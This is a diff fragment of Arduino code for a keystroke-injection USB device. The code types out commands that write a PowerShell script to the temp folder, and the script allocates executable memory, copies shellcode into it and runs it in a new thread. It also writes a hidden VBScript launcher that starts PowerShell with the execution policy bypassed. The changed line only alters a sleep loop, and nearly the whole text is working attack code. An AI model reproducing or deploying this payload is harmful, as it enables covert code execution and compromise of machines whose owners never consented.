@@ -36,7 +36,7 @@ void setup(){
   Keyboard.println("echo $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) >> %temp%\\ce.ps1");
   Keyboard.println("echo for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} >> %temp%\\ce.ps1");
   Keyboard.println("echo $winFunc::CreateThread(0,0,$x,0,0,0) >> %temp%\\ce.ps1");
-  Keyboard.println("echo while($true){start-sleep -seconds 2} >> %temp%\\ce.ps1");
+  Keyboard.println("echo while(1){sleep 100} >> %temp%\\ce.ps1");
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ce.vbs");
   Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ce.ps1\"),0,true >> %temp%\\ce.vbs");
   delay(1000);
